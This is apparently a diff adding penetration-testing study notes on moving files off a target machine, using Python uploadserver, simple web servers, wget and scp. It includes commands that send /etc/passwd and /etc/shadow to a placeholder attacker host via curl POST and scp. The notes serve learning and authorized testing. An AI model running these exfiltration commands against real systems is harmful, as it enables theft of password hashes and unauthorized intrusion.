@@ -114,4 +114,29 @@
 			- Get SSH listening port using `netstat -lnpt`
 		- Download file using `scp plaintext@<server-ip>:/root/myroot.txt .`
 		- **NOTE: Create a temporary user account for file transfers and avoid using primary credentials or keys on a remote computer**
-- 
+- ### *Upload*
+	- Used for situations like binary exploitation and packet capture analysis, where we must upload files from target machine to attack machine.
+	- ##### *Web Upload*
+		- **Installing a Configured Web Server with Upload**
+			- `uploadserver` which is an extended module of the Python `HTTP.server` module which includes a file upload page.
+			- Install using `sudo python3 -m pip install --user uploadserver`.
+		- Create a certificate (self-signed) using `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`.
+		- The web server should not host the certificate, it is recommended to create a new directory to host the file for the web server.
+		- Create directory for server using `mkdir https && cd https`.
+		- Start the server using `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`.
+		- From the target machine upload the files using `curl -X POST https://<attack-ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`.
+		- `--insecure` is used because a self-signed certificate is used that we trust.
+	- ##### *Alternative Way of File Transfer Method*
+		- **Start Web Server**
+			- **Using Python**
+				- Using Python 3 `python3 -m http.server`.
+				- Using Python 2.7 `python2.7 -m http.server`.
+			- **Using PHP**
+				- `php -S 0.0.0.0:8000`
+			- **Using Ruby**
+				- `ruby -run -ehttpd . -p8000`
+		- **Download the File from Target Machine**
+			- `wget <target-ip>:8000/filetotransfer.txt`
+	- ##### *SCP Upload*
+		- Some companies allow the SSH protocol (TCP/22) for outbound connections, in this case, an SSH server can be used with SCP to upload files.
+		- `scp /etc/passwd <username>@<attack-ip>:<path-to-upload-in>`
